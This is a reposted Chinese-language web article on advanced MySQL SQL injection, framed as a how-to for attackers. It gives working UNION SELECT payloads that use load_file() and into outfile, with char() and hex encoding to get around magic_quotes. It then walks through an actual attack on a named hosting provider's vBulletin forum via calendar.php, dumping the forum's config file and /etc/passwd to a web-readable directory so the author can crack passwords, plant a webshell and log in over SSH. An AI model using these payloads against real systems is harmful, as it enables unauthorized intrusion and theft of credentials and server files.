<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <title>Advanced SQL Injection with MySQL_mysql教程_IDC笔记</title>
    <meta name="keywords" content="PHP,PHP笔记,PHP教程" />
    <meta name="description" content="这篇文章主要为大家详细介绍了Advanced SQL Injection with MySQL，具有一定的参考价值，可以用来参考一下。

对此感兴趣的朋友，看看idc笔记做的技术笔记！
文/图 安全天使&amp;middot" />
    <meta content="Responsive admin theme build on top of Bootstrap 4" name="description" />
    <meta content="idcnote.com" name="author" />
    <link rel="shortcut icon" href="/skin1/images/favicon.ico">
    <!--Morris Chart CSS -->
    <link rel="stylesheet" href="/skin1/css/morris.css">
    <link href="/skin1/css/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/metismenu.min.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/icons.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/style.css" rel="stylesheet" type="text/css">
<link href="/SyntaxHighlighter/shCoreDefault.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">
 SyntaxHighlighter.all();
</script>
<script>
var paras = document.getElementsByTagName("pre");
for ( var i=0;i<paras.length;i++ ) {
    paras[i].setAttribute("class","brush:php;toolbar:false");     
}
</script>
</head>
<body>
<!-- Begin page -->
		<div id="wrapper">
			<!-- Top Bar Start -->
			<div class="topbar">
				<!-- LOGO -->
				<div class="topbar-left">
					<a href="/" class="logo">
						<span class="logo-light">
                            <i class="mdi mdi-camera-control"></i>IDC笔记
                        </span>
						<span class="logo-sm">
                            <i class="mdi mdi-camera-control"></i>
                        </span>
					</a>
				</div>
				<nav class="navbar-custom">
					<ul class="navbar-right list-inline float-right mb-0">
						<!--<li class="dropdown notification-list list-inline-item d-none d-md-inline-block">
							<a class="nav-link waves-effect" href="#" id="btn-fullscreen">
								<i class="mdi mdi-arrow-expand-all noti-icon"></i>
							</a>
						</li>
						<li class="dropdown notification-list list-inline-item">
							<div class="dropdown notification-list nav-pro-img">
								<a class="dropdown-toggle nav-link arrow-none nav-user" data-toggle="dropdown" href="#" role="button" aria-haspopup="false" aria-expanded="false">
									<img src="/skin1/picture/user-4.jpg" alt="user" class="rounded-circle">
								</a>
								<div class="dropdown-menu dropdown-menu-right profile-dropdown ">
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-account-circle"></i> Profile</a>
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-wallet"></i> Wallet</a>
									<a class="dropdown-item d-block" href="#">
										<span class="badge badge-success float-right">11</span>
										<i class="mdi mdi-settings"></i> Settings</a>
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-lock-open-outline"></i> Lock screen</a>
									<div class="dropdown-divider"></div>
									<a class="dropdown-item text-danger" href="#">
										<i class="mdi mdi-power text-danger"></i> Logout</a>
								</div>
							</div>
						</li>
						-->
					</ul>
					<ul class="list-inline menu-left mb-0">
						<li class="float-left">
							<button class="button-menu-mobile open-left waves-effect">
                            <i class="mdi mdi-menu"></i>
                        </button>
						</li>
						<li class="d-none d-md-inline-block">
							<form role="search" class="app-search">
								<div class="form-group mb-0">
									<input type="text" class="form-control" placeholder="Search..">
									<button type="submit"><i class="fa fa-search"></i></button>
								</div>
							</form>
						</li>
					</ul>
				</nav>
			</div>
<!-- ========== Left Sidebar Start ========== -->
<div class="left side-menu">
    <div class="slimscroll-menu" id="remove-scroll">
    <!--- Sidemenu -->
    <div id="sidebar-menu">
    <!-- Left Menu Start -->
    <ul class="metismenu" id="side-menu">
			<li>
	    <a href="/mysql/biji/" class="waves-effect">
		    <i class="icon-share"></i>
		    <span>数据库笔记
		       	<span class="float-right menu-arrow">
		       	<i class="mdi mdi-chevron-right"></i>
		       	</span>
		    </span>
	    </a>
	</li>
	</ul>
</div>
<!-- Sidebar -->
<div class="clearfix"></div>
</div>
<!-- Sidebar -left -->
</div>
<!-- Left Sidebar End -->
<!-- Start right Content here -->
<div class="content-page">
	<div class="content">
		<div class="container-fluid">
			<div class="page-title-box">
				<div class="row align-items-center">
					<div class="col-sm-6">
						<h1 class="page-title">Advanced SQL Injection with MySQL</h1>
					</div>
                    <div class="panel-title">
                        2022-11-12 09:17:08                    </div>
				</div>
				<!-- end row -->
			</div>
			<!-- end page-title -->
			<!-- START ROW -->
			<div class="panel panel-forbid">
				<div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>内容摘要</div>
			    <div class="panel-content">
			    <span>这篇文章主要为大家详细介绍了Advanced SQL Injection with MySQL，具有一定的参考价值，可以用来参考一下。

对此感兴趣的朋友，看看idc笔记做的技术笔记！
文/图 安全天使&amp;middot</span>                                     
		    	</div>
			    <div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>文章正文</div>
			    <div class="panel-content">
			    <span><p>这篇文章主要为大家详细介绍了Advanced SQL Injection with MySQL，具有一定的参考价值，可以用来参考一下。</p>

<p>对此感兴趣的朋友，看看idc笔记做的技术笔记！</p>
<p>文/图 安全天使&middot;angel[BST]</p>
<p><b>前言</b></p>
<p>　　我的《SQL Injection with MySQL》（《黑客防线》7月的专题）已经对MySQL的注入有了比较全面的介绍了，但是有一个危害相当大的函数，我并没有在文中提及，因为如果能灵活应用这个函数，那PHP甚至服务器的安全性均会大打折扣，由于《SQL Injection with MySQL》的发表时间是在暑假期间，考虑到很多新手、学生和品德败坏的人乱用，所以我并没有把这个写在该文里，其实本文在5月初已写完。专题发表后，很多人已经陆续转到PHP+MYSQL注入的研究，很多新技术将会陆续挖掘出来，我们所掌握这方面未公开的高级技巧也会陆续公布出来。至于比较基础的东西，本文就不再提了。</p>
<p><b>详细</b></p>
<p>　　我们知道，在SQL语句中，可以使用各种MySQL内置的函数，经常使用的就是DATABASE()、USER()、SYSTEM_USER()、SESSION_USER()、CURRENT_USER()这些函数来获取一些系统的信息，还有一个应用得比较多的函数，就是load_file()，该函数的作用是读入文件，并将文件内容作为一个字符串返回。　　看到这里，应该可以想到我们可以做什么了，就是读取一些机密文件，但是也是有条件限制的：</p>
<ul>
	<li>欲读取文件必须在服务器上</li>
	<li>必须指定文件完整的路径</li>
	<li>必须有权限读取并且文件必须完全可读</li>
	<li>欲读取文件必须小于 max_allowed_packet</li>
</ul>
<p>　　如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到只有administrators才能访问的文件，users就别想load_file出来。</p>
<p>　　在实际的注入中，我们有两个难点需要解决：</p>
<ul>
	<li>绝对物理路径</li>
	<li>构造有效的畸形语句</li>
</ul>
<p>　　在很多PHP程序中，当提交一个错误的Query，如果display_errors = on，程序就会暴露WEB目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP程序来说，整个服务器的安全将受到严重的威胁。构造语句已经是小意思了。</p>
<p><b>利用</b></p>
<p>　　我们假设一个程序的SQL语句如下：</p>
<p><font face="Courier New" style="BACKGROUND-COLOR: #cccccc">SELECT * FROM article WHERE articleid=$id</font></p>
<p>　　<i>注：当前条件：magic_quotes_gpc = off，c:/boot.ini可读。</i></p>
<p>　　此时，我们构造$id为：</p>
<p><font face="Courier New" style="BACKGROUND-COLOR: #cccccc">-1 union select 1,1,1,1,load_file(&#39;c:/boot.ini&#39;)</font></p>
<p>　　我们的Query就变成：</p>
<p><font face="Courier New" style="BACKGROUND-COLOR: #cccccc">SELECT * FROM article WHERE articleid=-1 union select 1,1,1,1,load_file(&#39;c:/boot.ini&#39;)</font></p>
<p>　　程序会把c:/boot.ini内容老老实实显示出来，但是现在magic_quotes_gpc = off的主机少之又少，怎么才能构造出没有引号的语句呢？看过《SQL Injection with MySQL》的朋友肯定知道用char()函数或者把字符转换成16进制，没错，就是它们。</p>
<p>　　<i>注：当前条件：magic_quotes_gpc = on，c:/boot.ini可读。</i></p>
<p>　　我们构造$id为：</p>
<p><font face="Courier New" style="BACKGROUND-COLOR: #cccccc">-1 union select 1,1,1,load_file(char(99, 58, 47, 98, 111, 111, 116, 46, 105, 110, 105))</font></p>
<p>　　&ldquo;char(99,58,47,98,111,111,116,46,105,110,105)&rdquo;就是&ldquo;c:/boot.ini&rdquo;的ASCII代码，我们的Query就变成：</p>
<p><font face="Courier New" style="BACKGROUND-COLOR: #cccccc">SELECT * FROM article WHERE articleid=-1 union select 1, 1, 1, load_file(char(99, 58, 47, 98, 111, 111, 116, 46, 105, 110, 105))</font></p>
<p>　　我们也可以成功的读取boot.ini文件，还有把字符串转换为16进制的，&ldquo;c:/boot.ini&rdquo;的16进制是&ldquo;0x633a2f626f6f742e696e69&rdquo;，所以上面的语句可以是这样：</p>
<p><font face="Courier New" style="BACKGROUND-COLOR: #cccccc">SELECT * FROM article WHERE articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</font></p>
<p>　　比较短了，看各人喜好了，大家可以在phpmyadmin或mysql&gt;下输入以下查询慢慢研究。</p>
<p><font face="Courier New" style="BACKGROUND-COLOR: #cccccc">SELECT load_file([string])</font></p>
<p>　　当然，在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们也可以用into outfile把文件导出。大家已经知道如何利用了，我也不说细节了，看一个实例说明一切。</p>
<p><b>实例</b></p>
<p>　　www.***host.cn是我国著名的FreeBSD主机提供商，我们就拿他来测试，因为它的论坛采用的是calendar.php存在问题的VBB论坛，我就不需要到处去找有漏洞的站点了（虽然到处都是）。这是一次完整的安全测试。仅仅获取信息，我并未进入服务器。</p>
<p>　　这里补充说明一点关于VBB的根目录下global.php的一段代码，如下：</p>
<p><font face="Courier New">&lt;?php </font><font face="Courier New">// get rid of slashes in get / post / cookie datafunction stripslashesarray (&amp;$arr</font><font face="Courier New">) {while (list($key,$val)=each($arr</font><font face="Courier New">)) {if ($key!=&quot;templatesused&quot; and $key!=&quot;argc&quot; and $key!=&quot;argv&quot;</font><font face="Courier New">) {if (is_string($val) AND (strtoupper($key)!=$key OR (&quot;&quot;.intval($key)==&quot;$key&quot;</font><font face="Courier New">))) {$arr[&quot;$key&quot;] = stripslashes($val</font><font face="Courier New">);} else if (is_array($val) AND ($key == &#39;HTTP_POST_VARS&#39; OR $key == &#39;HTTP_GET_VARS&#39; OR strtoupper($key)!=$key</font><font face="Courier New">)) {$arr[&quot;$key&quot;] = stripslashesarray($val</font><font face="Courier New">);}}}return $arr</font><font face="Courier New">;}if (get_magic_quotes_gpc() and is_array($GLOBALS</font><font face="Courier New">)) {if (isset($attachment</font><font face="Courier New">)) {$GLOBALS[&#39;attachment&#39;] = addslashes($GLOBALS[&#39;attachment&#39;</font><font face="Courier New">]);}if (isset($avatarfile</font><font face="Courier New">)) {$GLOBALS[&#39;avatarfile&#39;] = addslashes($GLOBALS[&#39;avatarfile&#39;</font><font face="Courier New">]);}$GLOBALS = stripslashesarray($GLOBALS</font><font face="Courier New">);}set_magic_quotes_runtime(0</font><font face="Courier New">); </font><font face="Courier New">?&gt; </font></p>
<p>　　这段代码的作用就是如果magic_quotes_gpc打开，就去掉所有特殊字符的前面的转义字符，所以，不管php.ini里magic_quotes_gpc的状态如何，我们输入的单引号都没有影响的，大家可以放心注入。呵呵。</p>
<p>　　我们知道，提交：</p>
<p><font face="Courier New" style="BACKGROUND-COLOR: #cccccc">/calendar.php?action=edit&amp;eventid=1 UNION SELECT 1, 1, 1, 1, username, password FROM user WHERE userid=1</font></p>
<p>　　是可以获取用户名和密码MD5散列的，但是由于特殊原因，并没有显示出来，但凭我的经验，知道并没有构造错，所以我们可以读取并导出成文件。　　因为事先我无意中访问到了含有phpinfo()的文件，所以知道了WEB的绝对路径，从访问站点的结果，发现一个下载系统是生成HTML文件的，如果那个目录没有可写权限，是不能生成HTML文件的，不过这一切都不是本文的重点，我们现在掌握如下信息：</p>
<ul>
	<li>WEB绝对路径：/home/4ngel</li>
	<li>可写目录路径：/home/4ngel/soft/</li>
	<li>magic_quotes_gpc = on</li>
</ul>
<p>　　和主机root相比，论坛的admin根本就不算什么，我对论坛admin也不感兴趣，我们要读取论坛的配置文件还有/etc/passwd，知道MySQL的连接信息，可以从这里入手，写webshell或其他的东西，知道/etc/passwd我们可以跑密码。直接从ssh上去。</p>
<p>　　VBB论坛的配置文件在/home/4ngel/forum/admin/config.php,转换成ASCII代码，提交：</p>
<p><font face="Courier New" style="BACKGROUND-COLOR: #cccccc">calendar.php?action=edit&amp;eventid=1 UNION SELECT 1, 1, 1, 1, 1, load_file(char(47, 104, 111, 109, 101, 47, 52, 110, 103, 101, 108, 47, 102, 111, 114, 117, 109, 47, 97, 100, 109, 105, 110, 47, 99, 111, 110, 102, 105, 103, 46, 112, 104, 112)) FROM user WHERE userid=1 into outfile &#39;/home/4ngel/soft/cfg.txt&#39;</font></p>
<p>　　呵呵，记得加一个where来定一个条件，否则如果论坛用户很多，那么导出的文件会相当大。或者干脆指定$eventid为一个不存在的值，就不用where了，就像这样：</p>
<p><font face="Courier New" style="BACKGROUND-COLOR: #cccccc">calendar.php?action=edit&amp;eventid=-1 UNION SELECT 1, 1, 1, 1, 1, load_file(char(47, 104, 111, 109, 101, 47, 52, 110, 103, 101, 108, 47, 102, 111, 114, 117, 109, 47, 97, 100, 109, 105, 110, 47, 99, 111, 110, 102, 105, 103, 46, 112, 104, 112)) FROM user into outfile &#39;/home/4ngel/soft/cfg.txt&#39;</font></p>
<p>　　/etc/passwd转换成ASCII代码，提交：</p>
<p><font face="Courier New" style="BACKGROUND-COLOR: #cccccc">calendar.php?action=edit&amp;eventid=-1 UNION SELECT 1,1,1,1,1, load_file (char(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100)) FROM user into outfile &#39;/home/4ngel/soft/etcpwd.txt&#39;</font></p>
<p>　　注意看到论坛的顶部，会出现下面的错误提示：</p>
<p><font face="Courier New"><strong>Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in /home/4ngel/forum/admin/db_mysql.php on line 154</strong></font></p>
<p>　　经验告诉我们，文件导出成功了，提交：</p>
<p><font face="Courier New">http://www.xxxhost.cn/soft/cfg.txthttp://www.xxxhost.cn/soft/etcpwd.txt</font></p>
<p>　　内容哗啦啦的出来了，而黑夜和猪蛋的他们入侵灰色的时候，一个个显示密码，欺骗，登陆后台，上传后门，读取config.php，一连串的步骤，我一个load_file()就搞定了。是不是危害很大？如图：</p>
<p align="center"><!---ecms -ecms 
【图缺】
--></p>
<p align="center"><!---ecms -ecms 
【图缺】
--></p>
<p>　　我记得在某个群里讨论到大家都是通过搞9****.net这个站，而进入黑白服务器的，没有办法对黑白横冲直闯，只得来曲线的。用load_file()函数，知道了某些信息就可以进入黑白所在的服务器，过程和上面的一样，利用show.php的漏洞，直接load_file出程序的配置文件，知道了mysql的信息，远程连接，写数据库导出文件，很容易获得服务器admin。</p>
<p><b>后记</b></p>
<p>　　由于危害太大，我一直都不太敢发布，相信国内也有人知道的。只是不公开而已。经过再三考虑还是决定发布了，希望大家掌握了以后，不要对国内的站点做任何具有破坏性的操作。谢谢合作！</p>

<p>注：关于Advanced SQL Injection with MySQL的内容就先介绍到这里，更多相关文章的可以留意</span>                                     
		    	</div>
		    	<div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>代码注释</div>
			    <div class="panel-content">
			    <span></span>                                     
		    	</div>
			</div>

			<!-- END ROW -->
			<div class="newsPage">
				<div class="newsPageTurn">
				    <span><a>上一篇</a><a href='/mysql/biji/535.html'>MySQL 常用数据库语句 小练习</a><a>下一篇</a><a href='/mysql/biji/537.html'>解决MySQL sql_mode修改不生效的问题</a></span>
				</div>
			</div>
		</div>


<div id="author-box">
    <h3>作者：喵哥笔记</h3>
        <div class="author-info">
            <div class="author-avatar">
                <img src="/skin1/picture/01.jpg" alt="IDC笔记" class="avatar" width="64" height="64">
            </div>
        <div class="author-description">
            <p>学的不仅是技术，更是梦想！</p>
            <ul class="author-social follows nb">
            	<li>
                    <a target="_blank" href="/" title="IDC笔记">IDC笔记</a>
                </li>
            </ul>
        </div>
        <div class="clear"></div>
    </div>
</div>
<script>
var paras = document.getElementsByTagName("pre");
for ( var i=0;i<paras.length;i++ ) {
    paras[i].setAttribute("class","brush:php;toolbar:false");     
}
</script>
<!-- container-fluid -->
	</div>
<!-- content -->
	<footer class="footer">
	© 2020 IDC笔记 <i class="mdi mdi-heart text-danger"></i>. | 备案号：<a href="https://beian.miit.gov.cn/">辽ICP备18000516号</a>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?674585fbbd2294d3faf910f668ea91b4";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

	</footer>
</div>

</div>
<!-- END wrapper -->
<!-- jQuery  -->
<script src="/skin1/js/jquery.min.js"></script>
<script src="/skin1/js/bootstrap.bundle.min.js"></script>
<script src="/skin1/js/metismenu.min.js"></script>
<script src="/skin1/js/jquery.slimscroll.js"></script>
<script src="/skin1/js/waves.min.js"></script>
<!--Morris Chart-->
<script src="/skin1/js/morris.min.js"></script>
<script src="/skin1/js/raphael.min.js"></script>
<script src="/skin1/js/dashboard.init.js"></script>
<script src="/skin1/js/app.js"></script>
<script src="/foot.js"></script>
</body>
</html>